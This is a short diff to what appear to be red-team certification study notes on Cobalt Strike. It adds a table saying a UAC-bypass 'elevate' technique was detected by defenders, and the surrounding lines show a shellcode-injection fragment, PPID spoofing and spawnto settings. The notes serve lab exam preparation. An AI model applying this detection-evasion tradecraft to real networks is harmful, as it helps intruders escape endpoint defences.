@@ -1006,3 +1006,11 @@ $var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0
    beacon> ppid <explorer.exe PID>
    beacon> spawnto x64 %windir%\sysnative\werfault.exe
 ```
+
+---
+
+## ⚠️ Defender Observations
+
+| Date | Technique | Result | Note |
+|------|-----------|--------|------|
+| 2026-04-26 | `elevate uac-token-duplication smb` | 🔴 DETECTED — beacon killed | Entire `elevate` built-in family is signatured. Never use on exam day. Use `steal_token` from SYSTEM proc or service EXE abuse instead. |
